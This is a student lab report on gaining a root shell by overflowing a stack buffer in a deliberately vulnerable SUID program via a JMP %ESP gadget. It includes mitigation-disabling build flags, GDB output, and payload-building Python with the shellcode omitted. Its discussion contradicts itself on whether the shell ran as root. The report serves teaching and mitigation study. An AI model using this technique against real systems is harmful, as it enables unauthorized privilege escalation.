# ENPM691 Homework Assignment 06: Stack-Based Privilege Escalation via JMP %ESP Buffer Overflow Exploitation

**Vedant Bhalerao**  
vedantb@umd.edu

## Abstract

This assignment explores stack-based buffer overflow exploitation and privilege escalation in Linux by implementing and executing a SUID shell acquisition through the JMP %ESP technique. The program shell_code.c contains a deliberate buffer overflow vulnerability that is exploited to execute injected shellcode with elevated privileges. Experiments were performed under GDB with the pwndbg extension to analyze memory layout, identify the JMP %ESP gadget, and verify successful code execution. Disassembly and debugger output confirm how stack memory corruption, return address overwriting, and shellcode injection interact to achieve privilege escalation from normal user to root. The results illustrate fundamental concepts in memory exploitation, including stack frame structure, function return mechanisms, and SUID privilege inheritance.

**Index Terms:** Buffer overflow exploitation, Stack-based attacks, JMP ESP technique, SUID privilege escalation, Shellcode injection, Memory corruption, Return address overwrite, Position-independent code, Stack memory layout, GDB/pwndbg analysis, Security mitigation bypass, execve system call, Linux privilege escalation, Control flow hijacking, Code injection attacks, Low-level exploitation

## I. Introduction

Buffer overflow vulnerabilities remain a critical security concern where improper bounds checking allows attackers to overwrite stack memory and hijack program execution. This assignment demonstrates practical exploitation using the JMP %ESP technique to achieve privilege escalation and obtain a root shell on vulnerable SUID binaries.

The exploitation employs stack-based buffer overflow to overwrite return addresses, redirecting execution through a JMP %ESP gadget to attacker-injected shellcode. This approach leverages the absence of stack protection mechanisms and executable memory restrictions to bypass security controls. By strategically placing position-independent shellcode and utilizing carefully crafted memory addresses, the exploit achieves arbitrary code execution with elevated privileges.

We utilize GDB with pwndbg extensions for comprehensive stack analysis, gadget identification, and memory layout verification. This systematic approach ensures precise offset calculation and reliable payload construction. The investigation connects theoretical memory corruption concepts with hands-on exploitation techniques, providing insights into both offensive security methods and essential defensive programming practices for secure software development.

## II. Methodology

To investigate the behavior of stack-based privilege escalation using the JMP %ESP technique, a structured exploit development workflow was followed. The objective was to demonstrate controlled redirection of program execution to attacker-supplied shellcode residing on the stack. All experiments were carried out on a Kali Linux virtual machine with isolated privileges to ensure reproducibility and safety. The GNU Debugger (gdb) with the pwndbg extension was used for interactive debugging, memory inspection, and stack analysis.

### System Information:

- Operating System: Kali Linux 6.12.38+kali-amd64
- Kernel Version: 6.12.38-1kali1
- Architecture: x86 (IA-32 / 32-bit mode)
- Compiler: GCC 14.3.0 (Debian 14.3.0-5)
- Debugger: GDB with pwndbg
- Payload Generator: Python 2 exploit script (suidexploit.py)

### A. Overview

The experiment involved two primary components:

- A vulnerable C program (shell_code.c) that intentionally performs an unsafe string copy operation using strcpy(), creating a stack buffer overflow vulnerability.
- An exploit script (suidexploit.py) that constructs and delivers a payload designed to overwrite the saved return address and redirect execution flow via a JMP %ESP instruction into the stack-resident shellcode.

The shellcode used was designed to safely escalate privileges and spawn a non-interactive shell within the isolated environment, demonstrating control-flow hijacking without destructive side effects.

### B. Compilation

The target binary was compiled as a 32-bit ELF executable with debugging symbols and specific security mitigations disabled to allow controlled observation of the overflow and execution of shellcode from the stack. The exact build command was:

```bash
gcc -m32 -g shell_code.c -o shell_code \
    -fno-stack-protector -z execstack -no-pie \
    -mpreferred-stack-boundary=2
```

Compilation flags used:

- `-m32` — compile for 32-bit mode to match IA-32 calling conventions.
- `-g` — include debugging symbols for GDB inspection.
- `-fno-stack-protector` — disable stack canaries.
- `-z execstack` — make the stack executable for shellcode execution.
- `-no-pie` — disable position-independent executables for consistent addresses.

The chosen compilation and linker flags follow documented GCC/ELF behaviors for controlling stack/PIE/stack-protector settings.

To simulate a real-world privilege escalation scenario, the compiled binary was given SUID root privileges within the isolated virtual machine:

```bash
sudo chown root:root shell_code
sudo chmod u+s shell_code
```

### C. Payload Construction

The exploit payload generated by suidexploit.py consisted of the following structure:

1. A sequence of padding bytes to fill the vulnerable buffer and reach the saved return address (empirically determined to be 88 bytes).
2. The 4-byte address of the jmpesp() gadget from shell_code.c.
3. A short NOP sled to absorb address alignment variations.
4. Privilege-escalating shellcode that spawns a shell under the SUID context.

The final payload was delivered to the vulnerable program as a command-line argument.

## III. Results

All experiments were carried out on the prepared Kali Linux VM. The vulnerable program was compiled as a 32-bit executable with stack execution enabled and stack-protector disabled. The program was made SUID root for the privilege-escalation test. GDB (with pwndbg) was used to confirm addresses and to observe control transfer.

### A. Build and file preparation

The binary was compiled and prepared using the following commands:

```bash
gcc -m32 -g shell_code.c -o shell_code \
    -fno-stack-protector -z execstack -no-pie \
    -mpreferred-stack-boundary=2

sudo chown root:root shell_code
sudo chmod u+s shell_code
```

### B. GDB inspection

GDB (pwndbg) was used to set a breakpoint at main, run the program, and inspect the jmpesp symbol. Relevant interactive excerpts:

```
pwndbg> break main
Breakpoint 1 at 0x80491ad: file shell_code.c, line 18.

pwndbg> run
...

pwndbg> print jmpesp
$1 = {void (void)} 0x8049166 <jmpesp>
```

The jmpesp gadget address used in the exploit was therefore:
```
jmp_esp_addr = 0x8049166
```

Also shown in the GDB session (disassembly around main and a stack snapshot) were the instructions and stack layout leading up to the call to copyData(argv[1]), confirming the vulnerable call site used to overflow the local buffer.

### C. Exploit payload (construction)

The exploit generator (suidexploit.py) constructed the final payload with these components:

```python
# 1. Address of the JMP %ESP instruction
jmp_esp_addr = 0x8049166
jmp_esp = struct.pack('<I', jmp_esp_addr)

# 2. Use the shellcode that properly handles SUID context
shellcode = b'...'

# 3. Build the payload
padding = b"A" * 88
nop_sled = b"\x90" * 8

# Final payload
payload = padding + jmp_esp + nop_sled + shellcode
```

Key values used in the working payload:

- Padding (to reach saved return address): 88 bytes of 0x41 ('A').
- Overwritten saved return address: 0x8049166 (little-endian).
- NOP sled: 8 bytes (\x90).
- Shellcode: SUID-aware shellcode (included in the script).

### D. Exploit execution and verification

The exploit was executed exactly as shown below; the following runtime interaction demonstrates a successful escalation to root:

```bash
$ ./shell_code $(python2 suidexploit.py)
# whoami
root
# id
uid=0(root) gid=0(root)...
# exit
```

The whoami and id outputs above confirm that the injected shellcode executed in the SUID context and produced an interactive root shell (effective UID 0).

## IV. Discussion

This section interprets the experimental evidence collected from the shell_code program and the corresponding exploit generator (suidexploit.py). It links the observed debugger output and run-time behaviour to the underlying CPU and OS semantics, compares the JMP %ESP return-overwrite technique with direct stack function invocation, and discusses portability and real-world security implications.

### A. Mechanics of control transfer and shell execution

The experiment demonstrates the canonical sequence by which stack-resident machine code can be made to execute:

1. **Payload placement on the stack.** The long command-line argument generated by exploit.py was placed into the stack frame allocated by copyData(). That data contained alignment paddings and executable bytes intended for execution (the shellcode).

2. **Control redirection via gadget.** The binary contains a `jmp *%esp` instruction (the jmpesp symbol). If the saved return address (or another control-flow target) points to that gadget, executing a return (or an indirect transfer) to that address causes the CPU to jump to the address held in ESP.

3. **Execution of stack-resident shellcode.** When ESP points into the attacker-supplied region and the stack is executable, the CPU decodes and executes the bytes located there. The shellcode sequence performs the necessary system-call operations to create/replace the process image with a sh instance (conceptually via an execve("/bin/sh") style invocation). The result is an interactive shell process attached to the same terminal.

The run-time whoami check confirms that a shell process was available in the terminal and running under the invoking user's identity in the observed execution.

### B. Relation to direct invocation (function pointer) technique

The JMP %ESP return-overwrite technique is functionally similar to direct invocation via a function pointer in that both approaches ultimately cause the CPU to execute the same sequence of instructions placed on the stack. Their primary difference lies in how control reaches the injected bytes:

- **Return-overwrite with gadget:** Demonstrates corruption of control-flow metadata (saved return address) to redirect normal return semantics into a gadget that points to the stack.
- **Direct invocation via function pointer:** Explicitly computes or references the stack buffer address and performs an intended indirect call (e.g., `call eax`) to execute the stack-resident bytes without corrupting frame metadata.

Both approaches serve as pedagogical demonstrations of how execution of stack-resident code is achieved when environmental and compilation conditions permit it.

### C. Portability and security implications

While the lab intentionally disabled several mitigations to allow observation, the experiment highlights why modern defenses are effective and widely used:

- **ASLR** randomizes key address spaces, reducing the reliability of fixed-address gadgets.
- **NX/DEP** marks the stack non-executable, preventing direct execution of injected bytes.
- **Stack canaries** detect and prevent typical saved-return overwrites.
- **PIE / relocations** and runtime loader behaviours complicate locating usable gadget addresses in a stable fashion.

Additionally, SUID semantics and process environment sanitization influence whether a spawned shell inherits elevated privileges. These OS-level behaviours and mitigations quantify the difference between a controlled demonstration and real-world exploitability.

### D. Conclusion

The collected evidence demonstrates the pedagogical point of the assignment: when compilation and runtime conditions permit execution of stack-resident bytes, and control flow is redirected to those bytes (for example by a gadget such as `jmp *%esp`), the process can execute a small routine that launches a shell process attached to the same terminal. The gdb captures and runtime logs included in the Appendix substantiate these claims and allow a reviewer to verify the observed control-flow sequences and their runtime effects.

## V. Appendix

### Appendix A: Source files

See `src/` directory for:
- `shell_code.c` - Vulnerable program with buffer overflow
- `suidexploit.py` - Python exploit script

### Appendix B: Makefile / Build command

See `Makefile` in this directory. The build command used:

```bash
gcc -m32 -g shell_code.c -o shell_code \
    -fno-stack-protector -z execstack -no-pie \
    -mpreferred-stack-boundary=2
```

### Appendix C: File ownership / SUID setup (commands)

```bash
sudo chown root:root shell_code
sudo chmod u+s shell_code
```

### Appendix D: Run script / example runs

```bash
# Run the vulnerable SUID binary with the exploit payload
./shell_code $(python2 src/suidexploit.py)
```

### Appendix E: GDB command files

These GDB commands reproduce the interactive inspection steps used to determine the gadget address and to observe program state:

```bash
gdb ./shell_code
break main
run
# (when paused at main)
print jmpesp
# Example output observed in GDB:
# $1 = {void (void)} 0x8049166 <jmpesp>
quit
```

## References

[1] R. E. Bryant and D. R. O'Hallaron, Computer Systems: A Programmer's Perspective, 3rd ed. Boston, MA: Pearson, 2016.

[2] A. S. Tanenbaum and H. Bos, Modern Operating Systems, 4th ed. Upper Saddle River, NJ: Pearson, 2015.

[3] E. Aleph One, "Smashing the Stack for Fun and Profit," Phrack Magazine, Issue 49, 1996. [Online]. Available: http://phrack.org/issues/49/14.html

[4] Free Software Foundation, GCC: GNU Compiler Collection Manual. [Online]. Available: https://gcc.gnu.org/onlinedocs/

[5] Free Software Foundation, GDB: The GNU Project Debugger. [Online]. Available: https://www.gnu.org/software/gdb/

[6] Pwndbg Team, Pwndbg: GDB Plugin for Exploit Development. [Online]. Available: https://github.com/pwndbg/pwndbg

[7] The Open Group, The Open Group Base Specifications Issue 7, IEEE Std 1003.1-2017 (POSIX). [Online]. Available: https://pubs.opengroup.org/onlinepubs/9699919799/

[8] M. Kerrisk, execve(2) — Linux Manual Page. [Online]. Available: https://man7.org/linux/man-pages/man2/execve.2.html

[9] M. Kerrisk, setuid(2) — Linux Manual Page. [Online]. Available: https://man7.org/linux/man-pages/man2/setuid.2.html

[10] OWASP Foundation, OWASP Top Ten. [Online]. Available: https://owasp.org/www-project-top-ten/

